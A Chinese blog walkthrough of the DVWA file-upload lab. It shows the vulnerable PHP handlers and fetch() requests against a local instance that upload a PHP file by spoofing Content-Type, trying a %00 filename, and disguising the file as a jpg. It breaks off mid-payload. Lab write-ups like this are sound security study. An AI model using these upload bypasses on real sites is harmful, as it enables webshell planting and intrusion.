@@ -1,0 +1,200 @@
+<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>DVWA上手记录-文件上传</title><meta content=DVWA上手记录-文件上传 name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=DVWA上手记录-文件上传 property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/ property=twitter:url><meta content=DVWA上手记录-文件上传 property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
+        renderMathInElement(document.body, {
+            // customised options
+            // • auto-render specific keys, e.g.:
+            delimiters: [
+                { left: '$$', right: '$$', display: true },
+                { left: '$', right: '$', display: false },
+                { left: '\\(', right: '\\)', display: false },
+                { left: '\\[', right: '\\]', display: false }
+            ],
+            // • rendering keys, e.g.:
+            throwOnError: true
+        });
+    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
+        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
+        const mermaidElements = document.getElementsByClassName('language-mermaid');
+        for (let i = 0; i < mermaidElements.length; i++) {
+            const el = mermaidElements.item(i);
+            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
+                el.innerHTML = el.textContent;
+                el.classList.add('mermaid');
+            }
+        }
+
+        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
+    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>DVWA上手记录-文件上传</h1><p class=author-line>作于：2022-04-27 12:00 ，预计阅读时间 8 分钟<article><h2 id=qian-yan>前言</h2><p>快速过一下文件上传。老写一大串没用的这次简洁点。<h2 id=yuan-li>原理</h2><ol><li>文件传到服务器上了。<li>没做好文件类型过滤和执行权限的控制，传上来的文件包含恶意代码。</ol><p>上传的恶意文件被执行，于是寄。<h2 id=jie-ti>解题</h2><h3 id=shou-ji-xin-xi>收集信息</h3><p><img alt=image-20220426160039663 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426160039663.webp><p>一个文件上传表单，提示选择图片上传。<p><img alt=image-20220426160116588 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426160116588.webp><p>点击选择文件发现前端就没过滤文件类型。随便选了个文件上传。<p><img alt=image-20220426160207958 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426160207958.webp><p>...行，直接寄了。<h3 id=lownan-du>Low难度</h3><p>看一眼代码，没有任何防护，逻辑清晰：取文件名，拼接到上传位置，然后把临时文件移动过去。就这样。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>
+</span><span>&lt;?php
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>( $_POST[ </span><span style=color:#b8bb26>'Upload' </span><span style=color:#fdf4c1>] ) ) {
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Where are we going to be writing to?
+</span><span style=color:#fdf4c1>    $target_path  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>DVWA_WEB_PAGE_TO_ROOT </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>"hackable/uploads/"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    $target_path </span><span style=color:#fe8019>.= </span><span style=color:#fabd2f>basename</span><span style=color:#fdf4c1>( $_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'name' </span><span style=color:#fdf4c1>] );
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Can we move the file to the upload folder?
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fe8019>!</span><span style=color:#fabd2f>move_uploaded_file</span><span style=color:#fdf4c1>( $_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'tmp_name' </span><span style=color:#fdf4c1>], $target_path ) ) {
+</span><span style=color:#fdf4c1>        </span><span style=color:#928374;font-style:italic>// No
+</span><span style=color:#fdf4c1>        </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    }
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>else </span><span style=color:#fdf4c1>{
+</span><span style=color:#fdf4c1>        </span><span style=color:#928374;font-style:italic>// Yes!
+</span><span style=color:#fdf4c1>        </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;pre>{</span><span style=color:#fdf4c1>$target_path</span><span style=color:#b8bb26>} succesfully uploaded!&lt;/pre>"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    }
+</span><span style=color:#fdf4c1>}
+</span><span style=color:#fdf4c1>
+</span><span>?>
+</span></code></pre><p>直接传一个 php 文件也不会拦，所以直接传个上去。就刚才的 1.php 好了。然后访问。<p><img alt=image-20220426160503041 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426160503041.webp><p>成功。<h3 id=mediumnan-du>Medium难度</h3><p>前端没变化，看源码。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>( $_POST[ </span><span style=color:#b8bb26>'Upload' </span><span style=color:#fdf4c1>] ) ) {
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Where are we going to be writing to?
+</span><span style=color:#fdf4c1>    $target_path  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>DVWA_WEB_PAGE_TO_ROOT </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>"hackable/uploads/"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    $target_path </span><span style=color:#fe8019>.= </span><span style=color:#fabd2f>basename</span><span style=color:#fdf4c1>( $_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'name' </span><span style=color:#fdf4c1>] );
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// File information
+</span><span style=color:#fdf4c1>    $uploaded_name </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'name' </span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>    $uploaded_type </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'type' </span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>    $uploaded_size </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'size' </span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Is it an image?
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( ( $uploaded_type </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"image/jpeg" </span><span style=color:#fe8019>|| </span><span style=color:#fdf4c1>$uploaded_type </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"image/png" </span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>&&
+</span><span style=color:#fdf4c1>        ( $uploaded_size </span><span style=color:#fe8019>&lt; </span><span style=color:#d3869b>100000 </span><span style=color:#fdf4c1>) ) {
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>        </span><span style=color:#928374;font-style:italic>// Can we move the file to the upload folder?
+</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fe8019>!</span><span style=color:#fabd2f>move_uploaded_file</span><span style=color:#fdf4c1>( $_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'tmp_name' </span><span style=color:#fdf4c1>], $target_path ) ) {
+</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// No
+</span><span style=color:#fdf4c1>            </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>        }
+</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>else </span><span style=color:#fdf4c1>{
+</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Yes!
+</span><span style=color:#fdf4c1>            </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;pre>{</span><span style=color:#fdf4c1>$target_path</span><span style=color:#b8bb26>} succesfully uploaded!&lt;/pre>"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>        }
+</span><span style=color:#fdf4c1>    }
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>else </span><span style=color:#fdf4c1>{
+</span><span style=color:#fdf4c1>        </span><span style=color:#928374;font-style:italic>// Invalid file
+</span><span style=color:#fdf4c1>        </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>'&lt;pre>Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre>'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    }
+</span><span style=color:#fdf4c1>}
+</span><span style=color:#fdf4c1>
+</span><span>?>
+</span></code></pre><p>主要变化出现在 <code>if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && ( $uploaded_size &lt; 100000 ) )</code> 这段代码。<code>uploaded_type</code> 是 <code>$_FILES['uploaded']['type']</code>，查文档可知<p><img alt=image-20220426160910787 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426160910787.webp><p>类型信息是由浏览器提供的，因此可以选择自己构造一个文件上传请求，改掉 Content-Type 之后发出去。偷懒直接把 Low 难度下的文件上传请求右键复制 fetch 出来（edge/chrome 对 <code>multipart/form-data</code> 的请求不能复制出请求体，这一步只能用火狐），把复制出来的命令的 <code>body</code> 里：<ol><li><code>Content-Type</code> 改成 <code>image/jpeg</code>。<li>文件名改成 <code>2.php</code>，以区别于 Low 难度下的 <code>1.php</code></ol><pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/#"</span><span>, {
+</span><span>    </span><span style=color:#b8bb26>"credentials"</span><span>: </span><span style=color:#b8bb26>"include"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"headers"</span><span>: {
+</span><span>        </span><span style=color:#b8bb26>"User-Agent"</span><span>: </span><span style=color:#b8bb26>"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept-Language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Content-Type"</span><span>: </span><span style=color:#b8bb26>"multipart/form-data; boundary=---------------------------257607891334311387353687588123"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Upgrade-Insecure-Requests"</span><span>: </span><span style=color:#b8bb26>"1"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-User"</span><span>: </span><span style=color:#b8bb26>"?1"
+</span><span>    },
+</span><span>    </span><span style=color:#b8bb26>"referrer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#b8bb26>"-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"2.php\"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php phpinfo(); ?>\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"POST"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"mode"</span><span>: </span><span style=color:#b8bb26>"cors"
+</span><span>});
+</span></code></pre><p>然后贴回浏览器控制台执行。<p><img alt=image-20220426163242992 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426163242992.webp><p>成功。<h3 id=highnan-du>High难度</h3><p>观察源码<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>( $_POST[ </span><span style=color:#b8bb26>'Upload' </span><span style=color:#fdf4c1>] ) ) {
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Where are we going to be writing to?
+</span><span style=color:#fdf4c1>    $target_path  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>DVWA_WEB_PAGE_TO_ROOT </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>"hackable/uploads/"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    $target_path </span><span style=color:#fe8019>.= </span><span style=color:#fabd2f>basename</span><span style=color:#fdf4c1>( $_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'name' </span><span style=color:#fdf4c1>] );
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// File information
+</span><span style=color:#fdf4c1>    $uploaded_name </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'name' </span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>    $uploaded_ext  </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>substr</span><span style=color:#fdf4c1>( $uploaded_name, </span><span style=color:#fabd2f>strrpos</span><span style=color:#fdf4c1>( $uploaded_name, </span><span style=color:#b8bb26>'.' </span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>);
+</span><span style=color:#fdf4c1>    $uploaded_size </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'size' </span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>    $uploaded_tmp  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_FILES[ </span><span style=color:#b8bb26>'uploaded' </span><span style=color:#fdf4c1>][ </span><span style=color:#b8bb26>'tmp_name' </span><span style=color:#fdf4c1>];
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Is it an image?
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( ( </span><span style=color:#fabd2f>strtolower</span><span style=color:#fdf4c1>( $uploaded_ext ) </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"jpg" </span><span style=color:#fe8019>|| </span><span style=color:#fabd2f>strtolower</span><span style=color:#fdf4c1>( $uploaded_ext ) </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"jpeg" </span><span style=color:#fe8019>|| </span><span style=color:#fabd2f>strtolower</span><span style=color:#fdf4c1>( $uploaded_ext ) </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"png" </span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>&&
+</span><span style=color:#fdf4c1>        ( $uploaded_size </span><span style=color:#fe8019>&lt; </span><span style=color:#d3869b>100000 </span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>&&
+</span><span style=color:#fdf4c1>        </span><span style=color:#fabd2f>getimagesize</span><span style=color:#fdf4c1>( $uploaded_tmp ) ) {
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>        </span><span style=color:#928374;font-style:italic>// Can we move the file to the upload folder?
+</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fe8019>!</span><span style=color:#fabd2f>move_uploaded_file</span><span style=color:#fdf4c1>( $uploaded_tmp, $target_path ) ) {
+</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// No
+</span><span style=color:#fdf4c1>            </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>        }
+</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>else </span><span style=color:#fdf4c1>{
+</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Yes!
+</span><span style=color:#fdf4c1>            </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;pre>{</span><span style=color:#fdf4c1>$target_path</span><span style=color:#b8bb26>} succesfully uploaded!&lt;/pre>"</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>        }
+</span><span style=color:#fdf4c1>    }
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>else </span><span style=color:#fdf4c1>{
+</span><span style=color:#fdf4c1>        </span><span style=color:#928374;font-style:italic>// Invalid file
+</span><span style=color:#fdf4c1>        </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>'&lt;pre>Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre>'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>    }
+</span><span style=color:#fdf4c1>}
+</span><span style=color:#fdf4c1>
+</span><span>?>
+</span></code></pre><p>注意到改为使用文件后缀名判断，但取后缀名的逻辑有点意思：<code>$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);</code><p><code>strrpos</code> 会返回最后一次出现<code>.</code>的位置，然后<code>substr</code>从这个位置+1截取字符串，比如<code>1.jpg</code>就会取到<code>jpg</code>。直觉告诉我可以转义或者<code>%00</code>截断来解决这个问题，直接在 medium 难度的 payload 上改一改文件名<code>1.php%00.jpg</code>，然后贴进控制台试试。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/#"</span><span>, {
+</span><span>    </span><span style=color:#b8bb26>"credentials"</span><span>: </span><span style=color:#b8bb26>"include"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"headers"</span><span>: {
+</span><span>        </span><span style=color:#b8bb26>"User-Agent"</span><span>: </span><span style=color:#b8bb26>"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept-Language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Content-Type"</span><span>: </span><span style=color:#b8bb26>"multipart/form-data; boundary=---------------------------257607891334311387353687588123"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Upgrade-Insecure-Requests"</span><span>: </span><span style=color:#b8bb26>"1"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-User"</span><span>: </span><span style=color:#b8bb26>"?1"
+</span><span>    },
+</span><span>    </span><span style=color:#b8bb26>"referrer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#b8bb26>"-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"3.php%00.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php phpinfo(); ?>\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"POST"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"mode"</span><span>: </span><span style=color:#b8bb26>"cors"
+</span><span>});
+</span></code></pre><p>观察响应发现不成功。直接放弃转义的想法，重新审阅下代码，没想出怎么直接 bypass 了。不过考虑是可以利用 apache 或者 nginx 的文件名解析漏洞，但我这个容器用了新版 apache 所以大概是不可行的=。=<p>另一种解法是利用文件包含漏洞，这个比较容易，改一下上面的 payload 把文件名改成 <code>3.jpg</code>。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/#"</span><span>, {
+</span><span>    </span><span style=color:#b8bb26>"credentials"</span><span>: </span><span style=color:#b8bb26>"include"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"headers"</span><span>: {
+</span><span>        </span><span style=color:#b8bb26>"User-Agent"</span><span>: </span><span style=color:#b8bb26>"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept-Language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Content-Type"</span><span>: </span><span style=color:#b8bb26>"multipart/form-data; boundary=---------------------------257607891334311387353687588123"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Upgrade-Insecure-Requests"</span><span>: </span><span style=color:#b8bb26>"1"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-User"</span><span>: </span><span style=color:#b8bb26>"?1"
+</span><span>    },
+</span><span>    </span><span style=color:#b8bb26>"referrer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#b8bb26>"-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"3.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php phpinfo(); ?>\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"POST"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"mode"</span><span>: </span><span style=color:#b8bb26>"cors"
+</span><span>});
+</span></code></pre><p>结果还是不行，重新审阅代码，注意到一个新出现的函数 <code>getimagesize</code>，查询文档得知是获取图片大小的函数，可能会读取文件内容=，=而我的图片不是合法的图片所以就寄了。于是再改一改，直接这次把 payload 附加在正常图片后。不过这次选择的是 <code>jpg</code> 后缀名和 <code>svg</code> 文件内容（防止jpg图片的二进制数据把php解释器搞挂了）。payload 改成如下。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/#"</span><span>, {
